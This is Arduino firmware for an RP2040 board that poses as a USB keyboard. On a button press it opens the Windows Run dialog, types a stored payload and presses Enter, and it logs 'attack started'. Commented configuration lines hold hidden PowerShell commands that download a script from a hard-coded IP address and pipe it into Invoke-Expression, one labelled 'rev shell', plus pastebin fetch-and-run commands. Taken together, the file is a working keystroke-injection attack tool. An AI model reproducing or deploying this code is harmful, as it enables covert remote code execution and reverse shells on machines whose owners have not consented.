#include "Adafruit_TinyUSB.h"
#include "HID_ASCII_TO_KEYCODE_EN_WITH_NUMPAD.h"
#include "HID_ASCII_TO_KEYCODE_FR_WITH_NUMPAD.h"

uint8_t const desc_hid_report[] = { TUD_HID_REPORT_DESC_KEYBOARD() };
Adafruit_USBD_HID usb_hid(desc_hid_report, sizeof(desc_hid_report), HID_ITF_PROTOCOL_KEYBOARD, 2, false);


#define EN 0
#define FR 1
#define total_langs 2
uint8_t const conv_tableEN[128][2] = { HID_ASCII_TO_KEYCODE_EN_WITH_NUMPAD };
uint8_t const conv_tableFR[128][2] = { HID_ASCII_TO_KEYCODE_FR_WITH_NUMPAD };
auto conv_table = &conv_tableFR;

const String supported_languages[] = { "EN", "FR" };
int selected_language_n = FR;
String selected_language = "FR";
String payload1 = "";
String payload2 = "";
String payload3 = "";
String msc_state = "on";


int get_language_n(String lang) {
  for (int i = 0; i < total_langs; i++) {
    if (supported_languages[i] == lang) {
      return i;
    }
  }
  return -1;
}
void setLanguage(String lang_str) {
  int i = get_language_n(lang_str);
  if (i == -1) return;
  setLanguage(i);
}
void setLanguage(int lang_number) {
  selected_language_n = lang_number;
  if (selected_language_n == EN) conv_table = &conv_tableEN;
  if (selected_language_n == FR) conv_table = &conv_tableFR;
}


/*------------ CONFIG -------------------*/

// // test payload
// String changeBGCommand = "curl https://pastebin.com/raw/5gdDzbJ6";
// String attackCommand = "curl http://13.95.212.250:8000/chimeraTHIS.ps1";
// String payload_attack = "powershell -WindowStyle Hidden -Command \"" + attackCommand + " -UseBasicParsing | Invoke-Expression\"";
// String payload_cahngeBG = "powershell -WindowStyle Hidden -Command \"" + changeBGCommand + " -UseBasicParsing | Invoke-Expression\"";

// String payload_test = "! \" # $ % & ' ( ) * + , - . / 0123456789 : ; < = > ? @ ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] \\ _ abcdefghijklmnopqrstuvwxyz | { } ";
// String payload = "aaa ... ,,, <<<";
/*---------------------------------------*/
// change background
// String payload = "powershell -WindowStyle Hidden -Command \"curl https://pastebin.com/raw/mUKrCLea -UseBasicParsing | Invoke-Expression\"";

// rev shell
// String payload = "powershell -WindowStyle Hidden -Command \"curl http://13.95.212.250:8000/chimeraTHIS.ps1 -UseBasicParsing | Invoke-Expression\"";


// test payload
// String payload = "! \" # $ % & ' #|#|||# () {} : / gGGgg";

void setup() {

#if defined(ARDUINO_ARCH_MBED) && defined(ARDUINO_ARCH_RP2040)
  // Manual begin() is required on core without built-in support for TinyUSB such as mbed rp2040
  TinyUSB_Device_Init(0);
#endif
  Serial.begin(115200);
  Serial.println("---------hello---------");

  fs_setup();
  load_msc_state();
  if (msc_state == "on") setup_msc();
  load_config();
  // Set up output report (on control endpoint) for Capslock indicator
  usb_hid.setReportCallback(NULL, hid_report_callback);
  usb_hid.begin();

  // wait until device mounted
  while (!TinyUSBDevice.mounted()) delay(1);

  // start serial

  // turn on built-in led
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  // make sure numlock is on
  assure_numlock_and_not_capslock();
  load_msc_state();



  // Serial.println("LEFTSHIFT: " + String(KEYBOARD_MODIFIER_LEFTSHIFT));
  // Serial.println("RIGHTSHIFT : " + String(KEYBOARD_MODIFIER_RIGHTSHIFT));
}



void loop() {

  if (BOOTSEL) {

    int press_count = 1;
    bool released = !BOOTSEL;
    unsigned long dt = millis();
    bool pressed = true;
    digitalWrite(LED_BUILTIN, HIGH);

    while (BOOTSEL || millis() - dt <= 350) {

      if (BOOTSEL && !pressed) {
        press_count++;
        pressed = true;
        dt = millis();
      } else if (!BOOTSEL && pressed) {
        pressed = false;
      }
    }

    dt = millis() - dt;
    if (dt >= 550 && !released) {
      Serial.println(">> long press count : " + String(press_count));

      // long press---------------------------------------------------------------------------------------------------------
      if (press_count == 1) {
        // one long press
        setLanguage((++selected_language_n) % total_langs);
        Serial.println("long press change language to :" + (selected_language_n ? String("FR") : String("EN")));
        return;
      }
      if (press_count == 2) {
        // two long presses
        Serial.println("Two long presses -> opening config mode");
        Serial.println("[started] "+msc_state);
        
        toggle_msc_mode();
        delay(1000);
        rp2040.restart();

        return;
      }

    } else if (usb_hid.ready()) {
      // short press---------------------------------------------------------------------------------------------------------
      Serial.println(">> short press count : " + String(press_count));

      digitalWrite(LED_BUILTIN, LOW);
      // start the attack
      Serial.println(">> attack started");

      assure_numlock_and_not_capslock();
      sendUSBKeyboardFrame(0, KEYBOARD_MODIFIER_LEFTGUI, HID_KEY_R);
      delay(200);
      switch (press_count) {
        case 1:
          deliverPayload(payload1);
          break;
        case 2:
          deliverPayload(payload2);
          break;
        case 3:
          deliverPayload(payload3);
          break;
      }
      sendUSBKeyboardFrame(0, 0, HID_KEY_KEYPAD_ENTER);
    }  //---------------------------------------------------------------------------------------------------------

    while (BOOTSEL)
      ;


  } else if (msc_state=="off") {
    // standby
    static unsigned long dt = millis();
    static bool state = 0;
    if (millis() - dt > 100 * int(selected_language_n + 1)) {
      dt = millis();
      state = !state;
      digitalWrite(LED_BUILTIN, state);
    }
  }
}
